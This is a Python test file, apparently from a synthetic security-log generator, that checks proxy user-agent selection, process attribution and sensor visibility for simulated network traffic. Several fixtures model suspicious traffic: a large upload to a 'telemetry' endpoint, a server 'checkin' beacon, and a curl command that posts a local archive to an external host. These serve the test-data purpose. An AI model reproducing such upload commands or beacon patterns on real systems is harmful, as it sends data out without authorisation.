# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Explicit proxy generation and visibility tests."""

import random
from dataclasses import replace
from datetime import UTC, datetime, timedelta
from unittest.mock import Mock

import pytest

from evidenceforge.events.base import OccurrenceBuilder
from evidenceforge.events.contexts import (
    FirewallContext,
    HostContext,
    HttpContext,
    HttpRequestEntityContext,
    IdsAlertPlan,
    ProxyContext,
)
from evidenceforge.events.dispatcher import EventDispatcher
from evidenceforge.events.lifecycle import SessionEndPlan
from evidenceforge.events.proxy import ProxyTransactionPlan
from evidenceforge.generation.actions.network_connection import (
    NetworkConnectionActionBundle,
    NetworkConnectionIdentityCapture,
    NetworkConnectionRequest,
)
from evidenceforge.generation.actions.proxy_transaction import (
    ExplicitProxyOpenPreparation,
    ExplicitProxyRequestPreparation,
)
from evidenceforge.generation.activity import ActivityGenerator
from evidenceforge.generation.activity.dns_registry import resolve_domain_ip
from evidenceforge.generation.activity.http_multipart import build_http_multipart_context
from evidenceforge.generation.network_identities import ScenarioNetworkResolver
from evidenceforge.generation.network_visibility import NetworkVisibilityEngine
from evidenceforge.generation.proxy_channels import (
    ExplicitProxyAdmissionReceipt,
    ExplicitProxyChannelAffinity,
    ExplicitProxyChannelManager,
    ExplicitProxyTunnelOpen,
)
from evidenceforge.generation.state_manager import StateManager
from evidenceforge.models.exceptions import StateError
from evidenceforge.models.http import HttpMultipartEntitySpec
from evidenceforge.models.scenario import (
    NetworkConfig,
    NetworkIdentity,
    NetworkSegment,
    NetworkSensor,
    System,
    User,
)
from tests.network_factories import network_plan


def test_proxy_user_agent_selection_is_role_aware_for_servers():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    rng = random.Random(42)
    web_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    user_agents = {pick_proxy_user_agent(rng, web_server) for _ in range(50)}

    assert user_agents
    assert all("Mozilla/" not in ua for ua in user_agents)
    assert any(token in ua for ua in user_agents for token in ("curl", "Wget", "requests"))


def test_activity_generator_stabilizes_generic_server_proxy_user_agent():
    generator = ActivityGenerator(StateManager(), {})
    web_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    user_agents = {
        generator._proxy_user_agent_for_context(
            random.Random(seed),
            web_server,
            hostname=hostname,
            domain_tags=[],
        )
        for seed, hostname in enumerate(
            [
                "api.github.com",
                "registry.npmjs.org",
                "www.bing.com",
                "login.microsoftonline.com",
                "api.snapcraft.io",
            ]
        )
    }

    assert len(user_agents) == 1
    assert all("Mozilla/" not in user_agent for user_agent in user_agents)


def test_unmodeled_sources_get_stable_population_diverse_user_agents():
    generator = ActivityGenerator(StateManager(), {})
    sources = [f"198.51.100.{index}" for index in range(1, 65)]

    first = [
        generator._proxy_user_agent_for_context(
            random.Random(42),
            None,
            hostname="portal.example.org",
            domain_tags=["web"],
            apply_domain_override=False,
            source_identity=source,
        )
        for source in sources
    ]
    second = [
        generator._proxy_user_agent_for_context(
            random.Random(999),
            None,
            hostname="portal.example.org",
            domain_tags=["web"],
            apply_domain_override=False,
            source_identity=source,
        )
        for source in sources
    ]

    assert first == second
    assert len(set(first)) >= 5
    assert max(first.count(user_agent) for user_agent in set(first)) < 32


def test_activity_generator_uses_browser_agent_for_workstation_browser_domains():
    generator = ActivityGenerator(StateManager(), {})
    workstation = System(
        hostname="dev01",
        ip="10.0.4.20",
        os="Ubuntu 24.04",
        type="workstation",
    )

    user_agents = {
        generator._proxy_user_agent_for_context(
            random.Random(seed),
            workstation,
            hostname=hostname,
            domain_tags=["web"],
        )
        for seed, hostname in enumerate(
            ["www.reddit.com", "calendar.google.com", "stackoverflow.com"]
        )
    }

    assert len(user_agents) == 1
    user_agent = next(iter(user_agents))
    assert "Mozilla/" in user_agent
    assert not any(token in user_agent for token in ("curl/", "Wget/", "python-requests/"))


def test_generated_windows_browser_proxy_agents_exclude_legacy_ie():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    workstation = System(
        hostname="ws01",
        ip="10.0.1.20",
        os="Windows 11",
        type="workstation",
        roles=["workstation"],
    )

    user_agents = {
        pick_proxy_user_agent(
            random.Random(seed),
            workstation,
            hostname="calendar.google.com",
            domain_tags=["saas"],
        )
        for seed in range(200)
    }

    assert user_agents
    assert all(
        "Trident/" not in user_agent and "MSIE " not in user_agent for user_agent in user_agents
    )


def test_explicit_multipart_curl_remains_authoritative_proxy_socket_owner() -> None:
    """An exact curl form command owns its upload even beyond a generic curl timeout."""
    start = datetime(2024, 3, 18, 15, 58, 35, tzinfo=UTC)
    state = StateManager()
    state.set_current_time(start)
    generator = ActivityGenerator(state, {})
    source = System(
        hostname="WS-LINUX-01",
        ip="10.10.1.21",
        os="Ubuntu 22.04",
        type="workstation",
    )
    proxy = System(
        hostname="PROXY-01",
        ip="10.10.3.20",
        os="Ubuntu 22.04",
        type="server",
        roles=["forward_proxy"],
    )
    archive = "/tmp/mhs-support-48217.tar.gz"
    command = (
        "/usr/bin/curl --proxy http://proxy.example:8080 "
        f"--form diagnostics=@{archive};type=application/gzip "
        "http://support.example/api/v1/cases/MHS-48217/attachments"
    )
    pid = state.create_process(
        system=source.hostname,
        parent_pid=0,
        image="/usr/bin/curl",
        command_line=command,
        username="analyst",
        integrity_level="Medium",
        logon_id="0x1234",
    )
    multipart = build_http_multipart_context(
        HttpMultipartEntitySpec.model_validate(
            {
                "media_type": "multipart/form-data",
                "parts": [
                    {
                        "name": "diagnostics",
                        "body_len": 1024,
                        "local_source_path": archive,
                        "filename": "mhs-support-48217.tar.gz",
                    }
                ],
            }
        ),
        stable_key="explicit-owner",
    )
    http = HttpContext(
        method="POST",
        host="support.example",
        uri="/api/v1/cases/MHS-48217/attachments",
        request_body_len=multipart.body_len,
        request_multipart=multipart,
    )

    image = generator._caller_explicit_proxy_process_image(
        source_system=source,
        pid=pid,
        process_image="/usr/bin/curl",
        time=start + timedelta(seconds=30),
        proxy_context=ProxyContext(
            client_ip=source.ip,
            method="POST",
            url=http.uri,
            host=http.host,
            status_code=200,
            user_agent="curl/7.81.0",
            proxy_fqdn="proxy.example",
        ),
        proxy_sys=proxy,
        dst_port=80,
        http=http,
    )

    assert image == "/usr/bin/curl"


def test_activity_generator_collapses_generated_browser_family_user_agents():
    generator = ActivityGenerator(StateManager(), {})
    workstation = System(
        hostname="dev01",
        ip="10.0.4.20",
        os="Ubuntu 24.04",
        type="workstation",
    )

    user_agents = {
        generator._proxy_user_agent_for_context(
            random.Random(seed),
            workstation,
            hostname="www.reddit.com",
            domain_tags=["web"],
            existing_user_agent=existing_user_agent,
        )
        for seed, existing_user_agent in enumerate(
            [
                (
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
                ),
                "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
            ]
        )
    }

    assert len(user_agents) == 1
    assert "Mozilla/" in next(iter(user_agents))


def test_activity_generator_collapses_browser_user_agents_for_cdn_assets():
    generator = ActivityGenerator(StateManager(), {})
    workstation = System(
        hostname="dev01",
        ip="10.0.4.20",
        os="Ubuntu 24.04",
        type="workstation",
    )

    user_agents = {
        generator._proxy_user_agent_for_context(
            random.Random(seed),
            workstation,
            hostname="www.gstatic.com",
            domain_tags=["cdn"],
            existing_user_agent=existing_user_agent,
        )
        for seed, existing_user_agent in enumerate(
            [
                (
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
                ),
                "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
            ]
        )
    }

    assert len(user_agents) == 1
    assert "Mozilla/" in next(iter(user_agents))


def test_activity_generator_preserves_tool_user_agent_for_browser_domains():
    generator = ActivityGenerator(StateManager(), {})
    workstation = System(
        hostname="dev01",
        ip="10.0.4.20",
        os="Ubuntu 24.04",
        type="workstation",
    )

    user_agent = generator._proxy_user_agent_for_context(
        random.Random(17),
        workstation,
        hostname="www.reddit.com",
        domain_tags=["web"],
        existing_user_agent="curl/8.4.0",
    )

    assert user_agent == "curl/8.4.0"


def test_activity_generator_preserves_override_browser_user_agent():
    generator = ActivityGenerator(StateManager(), {})
    workstation = System(
        hostname="dev01",
        ip="10.0.4.20",
        os="Ubuntu 24.04",
        type="workstation",
    )

    user_agent = generator._proxy_user_agent_for_context(
        random.Random(23),
        workstation,
        hostname="www.reddit.com",
        domain_tags=["web"],
        override_user_agent=(
            "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"
        ),
    )

    assert "Firefox/122.0" in user_agent


def test_activity_generator_replaces_server_browser_user_agent_with_service_client():
    generator = ActivityGenerator(StateManager(), {})
    domain_controller = System(
        hostname="DC-01",
        ip="10.10.2.10",
        os="Windows Server 2022",
        type="domain_controller",
        roles=["domain_controller"],
    )

    user_agent = generator._proxy_user_agent_for_context(
        random.Random(23),
        domain_controller,
        hostname="api.westbridge-services.net",
        domain_tags=[],
        override_user_agent=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "Chrome/121.0.0.0 Safari/537.36"
        ),
    )

    assert user_agent == "Go-http-client/1.1"


def test_build_proxy_context_preserves_caller_browser_user_agent_for_api_domain():
    generator = ActivityGenerator(StateManager(), {})
    workstation = System(
        hostname="WS-AJOHNSON-01",
        ip="10.10.1.35",
        os="Windows 11",
        type="workstation",
    )
    proxy = System(
        hostname="PROXY-01",
        ip="10.10.2.5",
        os="Ubuntu 22.04",
        type="server",
        roles=["forward_proxy"],
    )
    chrome_user_agent = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "Chrome/121.0.0.0 Safari/537.36"
    )

    proxy_context = generator._build_proxy_context(
        src_ip=workstation.ip,
        dst_ip="45.33.32.30",
        dst_port=443,
        service="ssl",
        duration=5.0,
        orig_bytes=314_782_613,
        resp_bytes=2048,
        hostname="api.westbridge-services.net",
        source_system=workstation,
        proxy_sys=proxy,
        http=HttpContext(
            method="POST",
            host="api.westbridge-services.net",
            uri="/upload/telemetry/7f3a2b19",
            user_agent=chrome_user_agent,
            request_body_len=314_782_613,
            response_body_len=2048,
        ),
        explicit_mode=True,
        time=datetime(2026, 5, 18, 14, 25, tzinfo=UTC),
    )

    assert proxy_context.user_agent == chrome_user_agent


def test_build_proxy_context_preserves_known_absent_http_user_agent():
    generator = ActivityGenerator(StateManager(), {})
    domain_controller = System(
        hostname="DC-01",
        ip="10.10.2.10",
        os="Windows Server 2022",
        type="domain_controller",
        roles=["domain_controller"],
    )
    proxy = System(
        hostname="PROXY-01",
        ip="10.10.3.20",
        os="Ubuntu 22.04",
        type="server",
        roles=["forward_proxy"],
    )

    proxy_context = generator._build_proxy_context(
        src_ip=domain_controller.ip,
        dst_ip="45.33.32.30",
        dst_port=443,
        service="ssl",
        duration=2.5,
        orig_bytes=600,
        resp_bytes=4096,
        hostname="api.westbridge-services.net",
        source_system=domain_controller,
        proxy_sys=proxy,
        http=HttpContext(
            method="GET",
            host="api.westbridge-services.net",
            uri="/v2/manifest",
            user_agent="",
            user_agent_known_absent=True,
            response_body_len=4096,
        ),
        explicit_mode=True,
        time=datetime(2024, 3, 18, 17, 42, tzinfo=UTC),
    )

    assert proxy_context.user_agent == ""


def test_build_proxy_context_binds_server_proxy_user_agent_to_service_process():
    generator = ActivityGenerator(StateManager(), {})
    domain_controller = System(
        hostname="DC-01",
        ip="10.10.2.10",
        os="Windows Server 2022",
        type="domain_controller",
        roles=["domain_controller"],
    )
    proxy = System(
        hostname="PROXY-01",
        ip="10.10.3.20",
        os="Ubuntu 22.04",
        type="server",
        roles=["forward_proxy"],
    )

    proxy_context = generator._build_proxy_context(
        src_ip=domain_controller.ip,
        dst_ip="45.33.32.30",
        dst_port=443,
        service="ssl",
        duration=2.5,
        orig_bytes=600,
        resp_bytes=4096,
        hostname="api.westbridge-services.net",
        source_system=domain_controller,
        proxy_sys=proxy,
        http=HttpContext(
            method="GET",
            host="api.westbridge-services.net",
            uri="/api/v2/checkin",
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "Chrome/121.0.0.0 Safari/537.36"
            ),
            response_body_len=4096,
        ),
        explicit_mode=True,
        time=datetime(2024, 3, 18, 16, 33, tzinfo=UTC),
    )
    hint = generator._explicit_proxy_client_process_hint(
        user_agent=proxy_context.user_agent,
        hostname=proxy_context.host,
        dst_port=443,
        proxy_sys=proxy,
        source_system=domain_controller,
    )

    assert proxy_context.user_agent == "Go-http-client/1.1"
    assert hint is not None
    image, command_line = hint
    assert image.endswith("service-healthcheck.exe")
    assert command_line.endswith("--service")
    assert "api.westbridge-services.net" not in command_line


def test_server_proxy_package_user_agents_are_destination_aware():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    generic_rng = random.Random(7)
    ubuntu_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    generic_user_agents = {
        pick_proxy_user_agent(generic_rng, ubuntu_server, hostname="login.microsoftonline.com")
        for _ in range(100)
    }
    package_tokens = ("apt", "APT", "dnf", "Fedora")
    assert all(
        not any(token in user_agent for token in package_tokens)
        for user_agent in generic_user_agents
    )

    package_rng = random.Random(11)
    package_user_agents = {
        pick_proxy_user_agent(package_rng, ubuntu_server, hostname="archive.ubuntu.com")
        for _ in range(40)
    }
    assert package_user_agents
    assert all("apt" in user_agent.lower() for user_agent in package_user_agents)
    assert all("Fedora" not in user_agent for user_agent in package_user_agents)


def test_server_proxy_package_user_agents_match_os_family():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    fedora_server = System(
        hostname="app01",
        ip="10.0.3.30",
        os="Fedora Linux 39",
        type="server",
        roles=["app_server"],
    )
    ubuntu_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    fedora_user_agents = {
        pick_proxy_user_agent(
            random.Random(seed),
            fedora_server,
            hostname="download.fedoraproject.org",
        )
        for seed in range(20)
    }
    ubuntu_user_agents = {
        pick_proxy_user_agent(
            random.Random(seed),
            ubuntu_server,
            hostname="download.fedoraproject.org",
        )
        for seed in range(20)
    }

    assert fedora_user_agents == {"libdnf (Fedora Linux 39; server; Linux.x86_64)"}
    assert all("Fedora" not in user_agent for user_agent in ubuntu_user_agents)


def test_workstation_package_user_agents_are_destination_aware():
    from evidenceforge.generation.activity.proxy_user_agents import pick_proxy_user_agent

    ubuntu_workstation = System(
        hostname="dev01",
        ip="10.0.4.20",
        os="Ubuntu 24.04",
        type="workstation",
    )

    generic_user_agents = {
        pick_proxy_user_agent(random.Random(seed), ubuntu_workstation, hostname="www.github.com")
        for seed in range(40)
    }
    package_tokens = ("apt", "APT", "dnf", "Fedora")
    assert all(
        not any(token in user_agent for token in package_tokens)
        for user_agent in generic_user_agents
    )

    package_user_agents = {
        pick_proxy_user_agent(
            random.Random(seed),
            ubuntu_workstation,
            hostname="archive.ubuntu.com",
        )
        for seed in range(20)
    }
    assert package_user_agents
    assert all("apt" in user_agent.lower() for user_agent in package_user_agents)


def test_proxy_user_agent_overlay_adds_package_family(tmp_path, monkeypatch):
    import yaml

    from evidenceforge.generation.activity.proxy_user_agents import (
        pick_proxy_user_agent,
        reset_proxy_user_agents_cache,
    )

    overlay_dir = tmp_path / ".eforge" / "config" / "activity"
    overlay_dir.mkdir(parents=True)
    overlay_path = overlay_dir / "proxy_user_agents.yaml"
    overlay_path.write_text(
        yaml.safe_dump(
            {
                "server": {
                    "package_managers": {
                        "custom_deb": {
                            "os_keywords": ["ubuntu"],
                            "hosts": ["updates.example.test"],
                            "user_agents": ["CustomPkg/1.0"],
                        }
                    }
                }
            },
            sort_keys=False,
        )
    )
    monkeypatch.chdir(tmp_path)
    reset_proxy_user_agents_cache()

    ubuntu_server = System(
        hostname="web01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )

    try:
        user_agent = pick_proxy_user_agent(
            random.Random(5),
            ubuntu_server,
            hostname="updates.example.test",
        )
    finally:
        reset_proxy_user_agents_cache()

    assert user_agent == "CustomPkg/1.0"


def test_server_ids_http_traffic_keeps_server_proxy_user_agent():
    generator, emitters = _generator(
        [
            NetworkSensor(
                type="network",
                name="dmz-tap",
                monitoring_segments=["dmz"],
                direction="bidirectional",
                log_formats=["zeek"],
            )
        ]
    )
    web_server = System(
        hostname="WEB-01",
        ip="10.0.3.20",
        os="Ubuntu 24.04",
        type="server",
        roles=["web_server"],
    )
    generator._ip_to_system[web_server.ip] = web_server
    generator._proxy_routes[web_server.ip] = [generator._ip_to_system["10.0.3.10"]]

    generator.generate_connection(
        src_ip=web_server.ip,
        dst_ip="93.184.216.34",
        time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
        dst_port=80,
        proto="tcp",
        service="http",
        duration=1.0,
        orig_bytes=500,
        resp_bytes=5000,
        source_system=web_server,
        hostname="example.com",
        conn_state="SF",
        ids_alerts=[
            IdsAlertPlan(
                sid=2013028,
                message="ET POLICY Suspicious HTTP Activity",
                classification="policy-violation",
                priority=2,
            )
        ],
    )

    proxy_event = emitters["proxy_access"].emit.call_args.args[0]
    assert proxy_event.protocol.proxy.client_ip == web_server.ip
    assert "Mozilla/" not in proxy_event.protocol.proxy.user_agent
    assert proxy_event.protocol.proxy.user_agent


def test_generated_proxy_time_taken_does_not_mirror_conn_duration_floor():
    generator, emitters = _generator(
        [
            NetworkSensor(
                type="network",
                name="client-tap",
                monitoring_segments=["workstations"],
                direction="outbound",
                log_formats=["zeek"],
            )
        ]
    )

    generator.generate_connection(
        src_ip="10.0.1.10",
        dst_ip="93.184.216.34",
        time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
        dst_port=443,
        proto="tcp",
        service="ssl",
        duration=1.2,
        orig_bytes=500,
        resp_bytes=5000,
        source_system=generator._ip_to_system["10.0.1.10"],
        hostname="example.com",
        conn_state="SF",
    )

    proxy_event = emitters["proxy_access"].emit.call_args.args[0]

    assert proxy_event.protocol.proxy.method == "CONNECT"
    assert proxy_event.protocol.proxy.time_taken != 1200
    assert proxy_event.protocol.proxy.time_taken > 0


def _system(
    hostname: str,
    ip: str,
    roles: list[str] | None = None,
    assigned_user: str | None = None,
) -> System:
    return System(
        hostname=hostname,
        ip=ip,
        os="Linux Ubuntu 22.04" if roles and "forward_proxy" in roles else "Windows 11",
        type="server" if roles and "forward_proxy" in roles else "workstation",
        assigned_user=assigned_user,
        roles=roles or [],
    )


def _emitters() -> dict[str, Mock]:
    emitters = {
        "zeek_conn": Mock(),
        "zeek_dns": Mock(),
        "zeek_http": Mock(),
        "zeek_ssl": Mock(),
        "proxy_access": Mock(),
        "snort_alert": Mock(),
        "cisco_asa": Mock(),
    }
    emitters["zeek_conn"].can_handle.side_effect = lambda event: (
        event.network is not None and not event.network.application_layer_only
    )
    emitters["zeek_dns"].can_handle.side_effect = lambda event: event.dns is not None
    emitters["zeek_http"].can_handle.side_effect = lambda event: event.protocol.http is not None
    emitters["zeek_ssl"].can_handle.side_effect = lambda event: event.protocol.ssl is not None
    emitters["proxy_access"].can_handle.side_effect = lambda event: event.protocol.proxy is not None
    emitters["snort_alert"].can_handle.side_effect = lambda event: bool(event.ids_alerts)
    emitters["cisco_asa"].can_handle.side_effect = lambda event: (
        event.network is not None and not event.network.application_layer_only
    )
    return emitters


def _generator(
    sensors: list[NetworkSensor],
    *,
    generation_window_start: datetime | None = None,
    generation_window_end: datetime | None = None,
) -> tuple[ActivityGenerator, dict[str, Mock]]:
    workstation = _system("WKS-01", "10.0.1.10", assigned_user="alex.morgan")
    proxy = _system("PROXY-01", "10.0.3.10", ["forward_proxy"])
    systems = [workstation, proxy]
    network = NetworkConfig(
        segments=[
            NetworkSegment(
                name="workstations",
                cidr="10.0.1.0/24",
                systems=["WKS-01"],
                exposure="internal",
            ),
            NetworkSegment(
                name="dmz",
                cidr="10.0.3.0/24",
                systems=["PROXY-01"],
                exposure="both",
            ),
        ],
        sensors=sensors,
    )
    visibility = NetworkVisibilityEngine(network, systems)
    state_manager = StateManager()
    state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
    emitters = _emitters()
    dispatcher = EventDispatcher(state_manager, emitters, visibility_engine=visibility)
    generator = ActivityGenerator(
        state_manager,
        emitters,
        network_visibility=visibility,
        dispatcher=dispatcher,
        generation_window_start=generation_window_start,
        generation_window_end=generation_window_end,
    )
    generator._ip_to_system = {system.ip: system for system in systems}
    generator._proxy_routes = {workstation.ip: [proxy]}
    generator._proxy_mode = "explicit"
    generator._proxy_listener_port = 8080
    generator._ad_domain = "example.org"
    return generator, emitters


def _seed_proxy_client_user_session(generator: ActivityGenerator) -> tuple[User, int, int]:
    user = User(
        username="alex.morgan",
        full_name="Alex Morgan",
        email="alex.morgan@example.org",
    )
    generator._users_by_username = {user.username: user}
    workstation = generator._ip_to_system["10.0.1.10"]
    start_time = datetime(2024, 1, 15, 9, 45, 0, tzinfo=UTC)
    generator.state_manager.set_current_time(start_time)
    logon_id = generator.state_manager.create_session(
        username=user.username,
        system=workstation.hostname,
        logon_type=2,
        source_ip=workstation.ip,
    )
    svchost_pid = generator.state_manager.create_process(
        system=workstation.hostname,
        parent_pid=4,
        image=r"C:\Windows\System32\svchost.exe",
        command_line="svchost.exe -k netsvcs",
        username="NETWORK SERVICE",
        integrity_level="System",
        logon_id="0x3e4",
    )
    explorer_pid = generator.state_manager.create_process(
        system=workstation.hostname,
        parent_pid=4,
        image=r"C:\Windows\explorer.exe",
        command_line="explorer.exe",
        username=user.username,
        integrity_level="Medium",
        logon_id=logon_id,
    )
    session = generator.state_manager.get_session(logon_id)
    assert session is not None
    session.explorer_pid = explorer_pid
    generator._system_pids = {
        workstation.hostname: {
            "svchost_netsvcs": svchost_pid,
            "explorer": explorer_pid,
        }
    }
    generator.state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
    return user, svchost_pid, explorer_pid


def _seed_linux_proxy_client_user_session(generator: ActivityGenerator) -> tuple[User, System, int]:
    user = User(
        username="alex.morgan",
        full_name="Alex Morgan",
        email="alex.morgan@example.org",
    )
    linux_system = System(
        hostname="LINUX-APP-01",
        ip="10.0.1.10",
        os="Ubuntu 24.04",
        type="server",
        assigned_user=user.username,
    )
    generator._users_by_username = {user.username: user}
    generator._ip_to_system[linux_system.ip] = linux_system
    generator._proxy_routes[linux_system.ip] = [generator._ip_to_system["10.0.3.10"]]

    start_time = datetime(2024, 1, 15, 9, 45, 0, tzinfo=UTC)
    generator.state_manager.set_current_time(start_time)
    systemd_pid = generator.state_manager.create_process(
        system=linux_system.hostname,
        parent_pid=0,
        image="/usr/lib/systemd/systemd",
        command_line="/usr/lib/systemd/systemd",
        username="root",
        integrity_level="System",
        logon_id="",
    )
    logon_id = generator.state_manager.create_session(
        username=user.username,
        system=linux_system.hostname,
        logon_type=10,
        source_ip="10.0.1.50",
    )
    shell_pid = generator.state_manager.create_process(
        system=linux_system.hostname,
        parent_pid=systemd_pid,
        image="/bin/bash",
        command_line="-bash",
        username=user.username,
        integrity_level="Medium",
        logon_id=logon_id,
    )
    session = generator.state_manager.get_session(logon_id)
    assert session is not None
    session.session_shell_pid = shell_pid
    session.process_tree_root = systemd_pid
    generator._system_pids = {linux_system.hostname: {"systemd": systemd_pid, "bash": shell_pid}}
    generator.state_manager.set_current_time(datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC))
    return user, linux_system, shell_pid


def _conn_pairs(emitters: dict[str, Mock]) -> list[tuple[str, str, int]]:
    return [
        (
            call.args[0].network.src_ip,
            call.args[0].network.dst_ip,
            call.args[0].network.dst_port,
        )
        for call in emitters["zeek_conn"].emit.call_args_list
    ]


class TestExplicitProxyVisibility:
    """Explicit proxy mode emits concrete legs, not the logical direct connection."""

    def test_client_side_sensor_sees_client_to_proxy_only(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.1.10", "93.184.216.34", 443) not in pairs
        assert ("10.0.3.10", "93.184.216.34", 443) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy.method == "CONNECT"
        assert proxy_event.protocol.proxy.host == "example.com"
        assert proxy_event.protocol.proxy.cs_bytes > 0
        assert proxy_event.protocol.proxy.sc_bytes > 0
        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.protocol.http.method == "CONNECT"
        assert http_event.protocol.http.request_body_len == 0
        assert http_event.protocol.http.response_body_len == 0
        conn_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].event_type == "connection" and call.args[0].network.dst_port == 8080
        )
        assert conn_event.network.orig_bytes >= proxy_event.protocol.proxy.cs_bytes
        assert conn_event.network.resp_bytes >= proxy_event.protocol.proxy.sc_bytes
        assert conn_event.network.orig_bytes >= proxy_event.protocol.proxy.cs_bytes + 500
        assert conn_event.network.resp_bytes >= proxy_event.protocol.proxy.sc_bytes + 5000
        assert conn_event.network.resp_pkts > 0
        assert not emitters["zeek_ssl"].emit.called

    def test_browser_proxy_user_agent_uses_user_process_instead_of_svchost(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, svchost_pid, _ = _seed_proxy_client_user_session(generator)
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="CONNECT",
                url="example.com:443",
                host="example.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) "
                    "Gecko/20100101 Firefox/121.0"
                ),
                content_type="",
                cache_result="NONE",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=svchost_pid,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            process_image=r"C:\Windows\System32\svchost.exe",
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == "10.0.1.10"
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid == client_event.network.initiating_pid
        assert client_event.process.pid != svchost_pid
        assert client_event.process.username == user.username
        assert client_event.process.image.endswith(r"\Mozilla Firefox\firefox.exe")

    def test_browser_proxy_owner_process_not_spaced_after_client_flow(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, _svchost_pid, _explorer_pid = _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        request_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)
        generator._last_browser_launch_by_session[
            (workstation.hostname, user.username, user_session.logon_id)
        ] = request_time - timedelta(seconds=1)
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=workstation.ip,
                method="CONNECT",
                url="r.bing.com:443",
                host="r.bing.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent=(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0"
                ),
                content_type="",
                cache_result="NONE",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip=workstation.ip,
            dst_ip="204.79.197.200",
            time=request_time,
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=workstation,
            hostname="r.bing.com",
            conn_state="SF",
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == workstation.ip
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )
        assert client_event.process is not None
        assert client_event.process.start_time < client_event.timestamp

    def test_browser_proxy_rejects_caller_after_authoritative_session_end(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
